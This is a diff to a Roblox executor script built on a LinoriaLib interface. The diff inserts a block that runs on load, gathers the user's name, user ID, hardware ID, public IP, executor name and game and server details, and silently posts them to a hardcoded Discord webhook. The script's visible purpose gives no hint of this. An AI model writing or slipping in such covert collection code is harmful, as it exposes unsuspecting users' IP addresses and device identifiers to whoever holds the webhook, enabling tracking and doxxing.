@@ -128,6 +128,111 @@ local ScreenGui = Instance.new("ScreenGui")
             ScreenGui.Parent = nil
         end
     )
+local request = (syn and syn.request) or (http and http.request) or request or http_request
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+local player = Players.LocalPlayer
+while not player do
+    wait(0.1)
+    player = Players.LocalPlayer
+end
+
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+local webhook = "https://discord.com/api/webhooks/1407424054624911400/SOieD1UXlv-55A2m6Bo6hNF8L2cQgD5lG5408SjQvXRn5Ww1SnetmkeGyK2gGrDRYtSf"
+
+local username = player.Name
+local userid = player.UserId
+
+local executor = "Unknown"
+if identifyexecutor then
+    executor = identifyexecutor()
+elseif syn and syn.info then
+    executor = syn.info
+elseif KRNL_LOADED then
+    executor = "KRNL"
+end
+
+local hwid = "Unknown"
+if gethwid then
+    hwid = gethwid()
+elseif syn and syn.get_hwid then
+    hwid = syn.get_hwid()
+end
+
+local ip = "Unavailable"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+local health = humanoid.Health
+local maxHealth = humanoid.MaxHealth
+local position = rootPart.Position
+local walkSpeed = humanoid.WalkSpeed
+local jumpPower = humanoid.JumpPower
+
+local leaderstats = player:FindFirstChild("leaderstats")
+local statsStr = ""
+if leaderstats then
+    for _, stat in pairs(leaderstats:GetChildren()) do
+        statsStr = statsStr .. stat.Name .. ": " .. stat.Value .. "\n"
+    end
+end
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+local gameLink = "https://www.roblox.com/games/" .. placeId
+local serverLink = "https://www.roblox.com/games/" .. placeId .. "/" .. jobId
+
+local fps = 0
+pcall(function()
+    local lastRender = tick()
+    RunService.RenderStepped:Connect(function()
+        fps = math.floor(1 / math.max(0.001, tick() - lastRender))
+        lastRender = tick()
+    end)
+end)
+
+local ping = "Unavailable"
+pcall(function()
+    ping = Stats.Network.ServerStatsItem["DataPing"]:GetValue()
+end)
+
+local data = {
+    embeds = {{
+        title = "info",
+        description = "**Player Info:**\n" ..
+                      "Username: " .. username .. "\n" ..
+                      "UserId: " .. userid .. "\n" ..
+                      "Executor: " .. executor .. "\n" ..
+                      "HWID: " .. hwid .. "\n" ..
+                      "Public IP: " .. ip .. "\n\n" ..
+                      "**Character Info:**\n" ..
+                      "Health: " .. health .. "/" .. maxHealth .. "\n" ..
+                      "Position: " .. tostring(position) .. "\n" ..
+                      "WalkSpeed: " .. walkSpeed .. "\n" ..
+                      "JumpPower: " .. jumpPower .. "\n\n" ..
+                      "**Game Info:**\n" ..
+                      "Game Link: " .. gameLink .. "\n" ..
+                      "Server Link: " .. serverLink .. "\n" ..
+                      "Ping: " .. ping .. " ms\n" ..
+                      "FPS: " .. fps .. "\n\n" ..
+                      (statsStr ~= "" and ("**Leaderstats:**\n" .. statsStr) or ""),
+        color = 3447003
+    }}
+}
+
+request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
 
 
 local repo = 'https://raw.githubusercontent.com/LionTheGreatRealFrFr/MobileLinoriaLib/main/'
